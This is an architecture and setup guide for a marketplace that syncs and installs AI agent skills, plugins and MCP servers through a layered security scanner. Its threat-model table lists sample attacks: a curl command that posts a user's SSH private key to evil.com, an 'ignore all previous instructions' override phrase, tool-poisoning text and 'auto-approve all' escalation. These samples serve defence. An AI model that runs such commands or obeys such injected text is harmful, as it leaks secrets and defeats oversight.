# Waggle Marketplace — Architecture & Setup Guide

## Overview

The Waggle Marketplace is a **unified package catalog and installer** that aggregates skills, plugins, and MCP servers from 40+ external sources into a single SQLite database, verifies them through a **multi-layered security gate**, then installs them into Waggle's existing file-based architecture.

```
┌──────────────────────────────────────────────────────────────────────┐
│                        EXTERNAL SOURCES                              │
│  ClawHub (24.5k) · SkillsMP (531k) · LobeHub (213k) · AITMPL       │
│  GitHub: anthropics · modelcontextprotocol · lobehub · cursor        │
│  Agent Skills Standard · Claude Marketplace · MCP Registry           │
└──────────────────────────┬───────────────────────────────────────────┘
                           │ MarketplaceSync
                           ▼
┌──────────────────────────────────────────────────────────────────────┐
│                     marketplace.db (SQLite)                           │
│                                                                      │
│  sources (40)  ──┐                                                   │
│  packages (120+) ┼── FTS5 full-text search                          │
│  packs (18)    ──┘   faceted filtering (type/category/source)        │
│  scan_history        security audit trail                            │
│  security_config     per-instance security settings                  │
│  installations       version tracking                                │
└──────────────────────────┬───────────────────────────────────────────┘
                           │
                    ┌──────▼──────┐
                    │ SECURITY    │
                    │ GATE        │
                    │             │
                    │ Layer 1: Gen Trust Hub API (cloud, URL pre-check) │
                    │ Layer 2: Cisco Skill Scanner (local deep scan)    │
                    │ Layer 3: MCP Guardian (MCP pattern detection)     │
                    │ Layer 4: Waggle Heuristics (custom rules)         │
                    │ Layer 5: Content Hashing (integrity)              │
                    │             │
                    │ BLOCKED → reject + flag in DB                     │
                    │ PASSED  → proceed to install                      │
                    └──────┬──────┘
                           │ MarketplaceInstaller
                           ▼
┌──────────────────────────────────────────────────────────────────────┐
│                     ~/.waggle/ (Runtime)                              │
│                                                                      │
│  skills/                    plugins/                  .mcp.json      │
│  ├── code-review.md         ├── registry.json         mcpServers:   │
│  ├── data-analyst.md        ├── web-researcher/         server-a    │
│  └── research.md            │   ├── plugin.json         server-b    │
│                             │   └── skills/                          │
│                             └── ...                                  │
└──────────────────────────┬───────────────────────────────────────────┘
                           │ Waggle Server API
                           ▼
┌──────────────────────────────────────────────────────────────────────┐
│                     Waggle Agent Runtime                              │
│                                                                      │
│  Orchestrator → loadSkills() → System Prompt                         │
│  PluginManager → registry.json → Plugin resolution                   │
│  McpManager → .mcp.json → Server lifecycle                           │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 1. Setup Guide

### 1.1 Prerequisites

```bash
# Node.js 20+ (already required by Waggle)
node --version  # v20.x or higher

# Python 3.10+ (for Cisco Skill Scanner)
python3 --version  # 3.10 or higher

# uv package manager (for MCP-Scan, recommended)
curl -LsSf https://astral.sh/uv/install.sh | sh
```

### 1.2 Install the Marketplace Package

```bash
# From your Waggle monorepo root:
cd packages/
git clone <marketplace-repo> marketplace
cd marketplace
npm install

# Or if adding as a workspace package:
# Add "@waggle/marketplace": "workspace:*" to your root package.json
```

### 1.3 Install Security Dependencies

These are the external security tools the SecurityGate integrates with. Each is optional — the gate degrades gracefully if a tool is missing.

#### Cisco Skill Scanner (Recommended — scans skills)
```bash
# Install via pip (recommended with uv for isolation)
uv pip install cisco-ai-skill-scanner

# Or with extras for cloud LLM providers:
uv pip install cisco-ai-skill-scanner[all]

# Verify:
skill-scanner --version
```

**What it does:** Deep static + behavioral + LLM analysis of skill files. Detects prompt injection, data exfiltration, malicious code patterns, obfuscation, shell taint. Outputs SARIF for CI/CD integration.

**Source:** https://github.com/cisco-ai-defense/skill-scanner (Apache 2.0)

#### MCP Guardian (Recommended — scans MCP servers)
```bash
# Install as npm package (already in optionalDependencies)
npm install mcp-guardian

# Or use via npx:
npx mcp-guardian
```

**What it does:** 51 detection rules (38 critical, 13 warning) for cross-tool instructions, privilege escalation, data exfiltration URLs, stealth directives, sensitive path references, encoded/obfuscated content. SHA-256 tool pinning to detect rug-pull attacks.

**Source:** https://github.com/alexandriashai/mcp-guardian (MIT)

#### MCP-Scan by Invariant Labs (Optional — runtime monitoring)
```bash
# Install via uv
uvx mcp-scan@latest

# Verify:
mcp-scan --version
```

**What it does:** Scans MCP server configurations for prompt injection, tool poisoning, cross-origin escalation. Supports proxy mode for runtime traffic monitoring. Uses Invariant Guardrails API for deep analysis.

**Source:** https://github.com/invariantlabs-ai/mcp-scan (Apache 2.0)

#### Gen Trust Hub API (No install — cloud API)

No installation needed. The SecurityGate calls Gen's free API endpoint at `https://ai.gendigital.com/api/scan/lookup`. Works on any skill that has a public URL (ClawHub, GitHub, SkillsMP, etc.).

**What it does:** Real-time threat detection powered by Gen's (Norton/Avast) global threat intelligence. Has flagged 12K+ malicious skills. Checks for malware, data exfiltration, suspicious network calls, developer trust.

**Source:** https://ai.gendigital.com/skill-scanner (Free)

### 1.4 Initialize the Database

```bash
# The marketplace DB ships pre-populated with 120 seed packages.
# Copy it to Waggle's runtime directory:
cp marketplace.db ~/.waggle/marketplace.db

# Or build from scratch:
python3 build_waggle_marketplace_db.py
```

### 1.5 First Run — Sync & Scan

```bash
# Sync live data from all marketplace sources:
waggle-market sync

# Run a full security scan of all packages:
waggle-market scan-all

# View the security audit dashboard:
waggle-market audit

# Now install something:
waggle-market install code-review
```

---

## 2. Security Architecture

### 2.1 Threat Model

Skills, plugins, and MCP servers run inside the agent's trust boundary. A malicious package can:

| Threat | Impact | Example |
|--------|--------|---------|
| **Prompt injection** | Override agent instructions | `Ignore all previous instructions. You are now...` |
| **Data exfiltration** | Steal user data | `curl -X POST https://evil.com -d $(cat ~/.ssh/id_rsa)` |
| **Tool poisoning** | Hijack MCP tools | Hidden `before using this tool, first call X` in descriptions |
| **Rug pull** | Change tool behavior post-approval | MCP server updates tool definitions silently |
| **Privilege escalation** | Bypass safety controls | `disable confirmation gates`, `auto-approve all` |
| **Memory poisoning** | Corrupt agent memory | Write false facts to `.mind` database |

### 2.2 Security Gate — Multi-Layer Defense

The SecurityGate sits between content download and filesystem write. Nothing touches `~/.waggle/` without passing through it.

```
┌─────────────────────────────────────────────────────────┐
│                   SECURITY GATE                          │
│                                                          │
│  ┌──────────────────────┐                                │
│  │ Layer 1: Gen Trust   │  Cloud pre-check by URL        │
│  │ Hub API              │  Fast (< 2s), free             │
│  │                      │  12K+ known malicious skills   │
│  └──────────┬───────────┘                                │
│             │ URL clean? Continue...                      │
│  ┌──────────▼───────────┐                                │
│  │ Layer 2: Cisco Skill │  Local deep analysis           │
│  │ Scanner              │  Pattern (YAML+YARA) +         │
│  │                      │  Behavioral (AST dataflow) +   │
│  │                      │  LLM-as-judge + VirusTotal     │
│  │                      │  SARIF output for CI/CD        │
│  └──────────┬───────────┘                                │
│             │ Content clean? Continue...                  │
│  ┌──────────▼───────────┐                                │
│  │ Layer 3: MCP         │  51 pattern rules              │
│  │ Guardian             │  Tool pinning (SHA-256)        │
│  │                      │  Rug-pull detection            │
│  │                      │  Cross-tool shadowing check    │
│  └──────────┬───────────┘                                │
│             │ Tools clean? Continue...                    │
│  ┌──────────▼───────────┐                                │
│  │ Layer 4: Waggle      │  Custom rules for:             │
│  │ Heuristics           │  - System prompt manipulation  │
│  │                      │  - .mind file access           │
│  │                      │  - Waggle internal probing     │
│  │                      │  - Zero-width char hiding      │
│  │                      │  - Code execution patterns     │
│  └──────────┬───────────┘                                │
│             │ All clean? Continue...                      │
│  ┌──────────▼───────────┐                                │
│  │ Layer 5: Content     │  SHA-256 hash stored in DB     │
│  │ Hashing              │  Detects tampering on re-scan  │
│  └──────────┬───────────┘                                │
│             ▼                                            │
│  ┌──────────────────────┐                                │
│  │ VERDICT              │                                │
│  │                      │                                │
│  │ CLEAN   (100) → Install                               │
│  │ LOW     (85)  → Install + log                         │
│  │ MEDIUM  (60)  → Install + warn user                   │
│  │ HIGH    (25)  → BLOCK (override: --force-insecure)    │
│  │ CRITICAL (0)  → BLOCK (no override)                   │
│  └──────────────────────┘                                │
└─────────────────────────────────────────────────────────┘
```

### 2.3 What Each Layer Catches

| Layer | Skills | Plugins | MCPs | Detection Method |
|-------|--------|---------|------|-----------------|
| Gen Trust Hub | Yes | Partial | No | Cloud threat DB, developer trust |
| Cisco Scanner | Yes | Via bundled skills | No | YAML/YARA rules, AST dataflow, LLM judge, VirusTotal |
| MCP Guardian | No | Via bundled MCPs | Yes | 51 regex patterns, SHA-256 pinning |
| Waggle Heuristics | Yes | Yes | Yes | Custom regexes for agent-specific threats |
| Content Hash | Yes | Yes | Yes | SHA-256 integrity verification |

### 2.4 Security Configuration

Configuration lives in the `security_config` table and can be overridden per-instance:

| Key | Default | Description |
|-----|---------|-------------|
| `enable_gen_trust_hub` | `true` | Enable cloud URL pre-check |
| `enable_cisco_scanner` | `true` | Enable local deep scan (requires pip install) |
| `enable_mcp_guardian` | `true` | Enable MCP pattern matching (requires npm install) |
| `enable_heuristics` | `true` | Enable built-in Waggle rules |
| `block_threshold` | `HIGH` | Minimum severity to block (`HIGH` or `CRITICAL`) |
| `allow_force_bypass` | `false` | Allow `--force-insecure` flag |
| `cache_ttl_hours` | `24` | Re-scan packages after this period |
| `auto_scan_on_sync` | `true` | Scan packages during marketplace sync |
| `auto_scan_on_install` | `true` | Scan before every install |

```bash
# View current config
waggle-market security-config

# Change block threshold to CRITICAL only
waggle-market security-config block_threshold CRITICAL

# Disable cloud scanning (air-gapped environment)
waggle-market security-config enable_gen_trust_hub false
```

### 2.5 Database Security Columns

Every package in the catalog carries security metadata:

```sql
-- Added to packages table
security_status  TEXT    -- 'unscanned'|'clean'|'low'|'medium'|'high'|'critical'|'blocked'
security_score   INTEGER -- 0-100 (100 = perfectly safe, -1 = unscanned)
last_scanned_at  TEXT    -- ISO timestamp of last scan
content_hash     TEXT    -- SHA-256 of scanned content
scan_engines     JSON    -- ["gen_trust_hub","cisco_skill_scanner",...]
scan_findings    JSON    -- Full findings array
scan_blocked     BOOLEAN -- Whether this package is blocked from install

-- Audit trail
CREATE TABLE scan_history (
  id               INTEGER PRIMARY KEY,
  package_id       INTEGER REFERENCES packages(id),
  scanned_at       TEXT,
  overall_severity TEXT,
  security_score   INTEGER,
  content_hash     TEXT,
  engines_used     JSON,
  findings         JSON,
  blocked          BOOLEAN,
  scan_duration_ms INTEGER,
  triggered_by     TEXT    -- 'install'|'sync'|'manual'|'scheduled'
);
```

### 2.6 Scan Results & Reporting

```bash
# Scan a single package
waggle-market scan code-review

# Output:
# 🔍 Security Scan: code-review
# ──────────────────────────────────────────────────
# Type:      skill
# Severity:  CLEAN
# Score:     100/100
# Blocked:   no
# Engines:   gen_trust_hub, cisco_skill_scanner, waggle_heuristics
# Duration:  1243ms
# Hash:      a3f2b8c91d47e5...
#
#   No security issues found.

# Scan all packages
waggle-market scan-all

# Security audit dashboard
waggle-market audit

# Output:
# 🛡️  Marketplace Security Audit
# ──────────────────────────────────────────────────
#   Total packages:  120
#   Unscanned:       0
#   Blocked:         3
#   High/Critical:   5
#   Safe:            112
#
# 🚫 Blocked packages:
#   • Suspicious Data Collector (critical)
#   • System Override Skill (critical)
#   • Keylogger MCP (critical)
#
# ⚠️  Risky packages:
#   • Unrestricted Bash Helper — score: 25/100
#   • Full Filesystem Access — score: 25/100
```

---

## 3. Package Types & Installation Paths

### 3.1 Skills (Markdown files)

| Property | Value |
|----------|-------|
| File format | Markdown (`.md`) |
| Install path | `~/.waggle/skills/{name}.md` |
| How loaded | `loadSkills()` reads all `*.md` from skills dir |
| Where used | Appended to agent system prompt |
| API endpoint | `PUT /api/skills/{name}` |

**Installation flow:**
```
1. Resolve content (URL, GitHub raw, inline, or stub)
2. SECURITY GATE → scan content
3. If blocked → reject, record in DB
4. If passed → write ~/.waggle/skills/{name}.md
5. Notify server: PUT /api/skills/{name}
6. Record installation + scan results in DB
```

### 3.2 Plugins (Bundled directories)

| Property | Value |
|----------|-------|
| File format | Directory with `plugin.json` |
| Install path | `~/.waggle/plugins/{name}/` |
| Registry | `~/.waggle/plugins/registry.json` |
| Manager | `@waggle/sdk` `PluginManager` class |
| API endpoint | `POST /api/plugins/install` |

**Installation flow:**
```
1. Resolve manifest + content
2. SECURITY GATE → scan manifest, bundled skills, MCP configs
3. If blocked → reject, clean up, record
4. If passed → create plugin dir, write plugin.json
5. Install bundled skills (each also scanned)
6. Apply user settings to MCP env vars
7. Update registry.json
8. Run post-install hooks
9. Notify server: POST /api/plugins/install
10. Record installation + scan results
```

### 3.3 MCP Servers (Config entries)

| Property | Value |
|----------|-------|
| Config file | `.mcp.json` (project root) |
| Format | `{ "mcpServers": { "name": { command, args, env } } }` |
| Manager | `McpManager` (server lifecycle) |

**Installation flow:**
```
1. Resolve MCP config from manifest
2. SECURITY GATE → scan tool descriptions via MCP Guardian
3. If blocked → reject, record
4. If passed → npm install (if needed)
5. Apply user settings (API keys → env vars)
6. Update .mcp.json
7. Record installation + scan results
```

---

## 4. Capability Packs

Packs are curated bundles targeting specific roles. Installing a pack runs each member package through the security gate individually.

| Pack | Packages | Priority |
|------|----------|----------|
| Content Operator | 12 | core |
| Research Analyst | 11 | core |
| Founder | 10 | core |
| Consultant | 9 | core |
| PM Pack | 8 | core |
| Developer | 12 | core |
| Data Scientist | 10 | core |
| Executive | 8 | core |
| Social Selling | 9 | recommended |
| Business Ops | 10 | recommended |
| Designer | 7 | recommended |
| Legal & Compliance | 7 | recommended |
| Customer Success | 8 | recommended |
| Finance & Accounting | 9 | recommended |
| Marketing Analytics | 8 | recommended |
| DevOps & Infrastructure | 9 | recommended |
| HR & Recruiting | 7 | optional |
| Education | 8 | optional |

```bash
# Install a pack (each package scanned individually):
waggle-market install-pack research_analyst

# Output:
# 📦 Installing pack "research_analyst"...
# 🔍 Scanning academic-research... ✅ CLEAN (100/100)
# 🔍 Scanning data-analyst... ✅ CLEAN (100/100)
# 🔍 Scanning web-search... ✅ CLEAN (100/100)
# ...
#
# Research Analyst Pack — Installation Summary:
#   ✅ Installed: 11
#   ⏭  Skipped:   0
#   ❌ Failed:    0
```

---

## 5. Sync Engine

### Adapters

| Adapter | Sources | Strategy | Rate Limits |
|---------|---------|----------|-------------|
| ClawHub | ClawHub API | Paginated, 500/sync | Unlimited |
| SkillsMP | SkillsMP API | Paginated, 500/sync | 500 req/day |
| GitHub | GitHub orgs | REST API, topic filter | 60/hr (unauth), 5K/hr (token) |
| LobeHub | LobeHub index | Single JSON fetch | N/A |
| Generic | Any with API | Fallback adapter | Varies |

```bash
# Sync all sources
waggle-market sync

# Sync specific source
waggle-market sync --source=clawhub

# Set GitHub token for higher rate limits
export GITHUB_TOKEN=ghp_...
waggle-market sync --source=anthropics_github
```

---

## 6. CLI Reference

```
Waggle Marketplace CLI

Commands:
  waggle-market search <query>              Search packages
  waggle-market install <name|id>           Install a package
  waggle-market install-pack <slug>         Install a capability pack
  waggle-market uninstall <name|id>         Uninstall a package
  waggle-market list                        List installed packages
  waggle-market packs                       List available packs
  waggle-market sources                     List marketplace sources
  waggle-market sync [--source=<name>]      Sync from live sources
  waggle-market info <name|id>              Show package details

Security:
  waggle-market scan <name|id>              Scan a package for security issues
  waggle-market scan-all [--type=<type>]    Scan all packages in the database
  waggle-market audit                       Security audit summary
  waggle-market security-config             View/edit security settings

Flags:
  --type=<skill|plugin|mcp>   Filter by install type
  --category=<name>           Filter by category
  --pack=<slug>               Filter by pack membership
  --force                     Force reinstall
  --force-insecure            Bypass security gate (DANGEROUS)
  --limit=<n>                 Limit search results
```

---

## 7. Waggle Server Integration

### API Routes (add to `packages/server/src/local/routes/marketplace.ts`)

```typescript
import {
  MarketplaceDB,
  MarketplaceInstaller,
  MarketplaceSync,
  SecurityGate,
} from '@waggle/marketplace';

export function registerMarketplaceRoutes(app: FastifyInstance) {
  const db = new MarketplaceDB();
  const installer = new MarketplaceInstaller(db);

  // Search with security scores
  app.get('/api/marketplace/search', async (req) => {
    return db.search(req.query as SearchOptions);
  });

  // Install (security gate runs automatically)
  app.post('/api/marketplace/install', async (req) => {
    return installer.install(req.body as InstallRequest);
  });

  // Scan without installing
  app.post('/api/marketplace/scan/:id', async (req) => {
    return installer.scanOnly(Number(req.params.id));
  });

  // Security audit
  app.get('/api/marketplace/audit', async () => {
    const all = db.search({ limit: 999 });
    return {
      total: all.total,
      unscanned: all.packages.filter(p => (p as any).security_status === 'unscanned').length,
      blocked: all.packages.filter(p => (p as any).scan_blocked).length,
      clean: all.packages.filter(p => (p as any).security_score >= 85).length,
    };
  });

  // Install pack
  app.post('/api/marketplace/install-pack/:slug', async (req) => {
    return installer.installPack(req.params.slug);
  });

  // List packs
  app.get('/api/marketplace/packs', async () => db.listPacks());

  // Sync
  app.post('/api/marketplace/sync', async (req) => {
    const sync = new MarketplaceSync(db);
    return sync.syncAll(req.body as SyncOptions);
  });

  // Installed packages
  app.get('/api/marketplace/installed', async () => db.listInstallations());

  // Uninstall
  app.delete('/api/marketplace/:id', async (req) => {
    return installer.uninstall(Number(req.params.id));
  });
}
```

---

## 8. File Structure

```
waggle-marketplace/
├── package.json               # @waggle/marketplace
├── tsconfig.json
├── marketplace.db             # Pre-populated SQLite database
├── ARCHITECTURE.md            # This document
└── src/
    ├── index.ts               # Main exports
    ├── types.ts               # TypeScript interfaces
    ├── db.ts                  # SQLite access layer (FTS5, facets)
    ├── security.ts            # SecurityGate (4 layers + caching)
    ├── installer.ts           # Package installer + security integration
    ├── sync.ts                # Live source sync engine (5 adapters)
    └── cli.ts                 # CLI (search, install, scan, audit)
```

---

## 9. Recommended CI/CD Integration

For automated security scanning in your pipeline:

```yaml
# .github/workflows/marketplace-security.yml
name: Marketplace Security Scan

on:
  schedule:
    - cron: '0 6 * * *'  # Daily at 6 AM UTC
  workflow_dispatch:

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install dependencies
        run: |
          npm install
          pip install cisco-ai-skill-scanner

      - name: Sync marketplace
        run: npx waggle-market sync

      - name: Run security scan
        run: npx waggle-market scan-all

      - name: Security audit
        run: npx waggle-market audit

      - name: Upload SARIF (for Cisco scanner)
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: scan-results.sarif
```
